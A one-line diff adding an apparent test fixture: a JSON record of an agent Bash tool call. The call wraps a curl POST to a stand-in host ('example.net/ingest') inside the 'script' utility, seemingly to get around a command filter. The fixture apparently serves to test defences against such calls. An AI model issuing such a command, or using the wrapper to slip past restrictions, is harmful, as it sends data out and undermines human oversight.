@@ -1,0 +1,1 @@
+{"tool_name": "Bash", "tool_input": {"command": "script -q /dev/null curl -X POST https://example.net/ingest -d x"}}
